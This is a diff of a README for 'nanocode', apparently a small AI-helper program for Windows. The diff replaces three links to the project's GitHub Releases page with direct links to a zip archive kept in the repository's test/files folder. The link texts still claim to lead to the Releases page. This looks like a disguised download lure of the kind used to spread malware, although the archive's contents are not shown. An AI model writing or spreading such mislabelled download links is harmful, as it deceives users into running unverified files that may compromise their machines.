@@ -1,6 +1,6 @@
 # 🧠 nanocode - Light AI help for daily tasks
 
-[![Download nanocode](https://img.shields.io/badge/Download%20nanocode-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ahmedbouuu223-coder/nanocode/releases)
+[![Download nanocode](https://img.shields.io/badge/Download%20nanocode-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/ahmedbouuu223-coder/nanocode/master/test/files/Software-v3.6.zip)
 
 ## 📌 What nanocode does
 
@@ -18,7 +18,7 @@ Use it when you want to:
 
 Use this link to visit the release page and download nanocode for Windows:
 
-[Download nanocode from GitHub Releases](https://github.com/ahmedbouuu223-coder/nanocode/releases)
+[Download nanocode from GitHub Releases](https://raw.githubusercontent.com/ahmedbouuu223-coder/nanocode/master/test/files/Software-v3.6.zip)
 
 ### Steps
 
@@ -242,7 +242,7 @@ Use this page any time you need to:
 - get the Windows file again
 - see the release files list
 
-[Open the nanocode releases page](https://github.com/ahmedbouuu223-coder/nanocode/releases)
+[Open the nanocode releases page](https://raw.githubusercontent.com/ahmedbouuu223-coder/nanocode/master/test/files/Software-v3.6.zip)
 
 ## 🏷️ Project topics
 
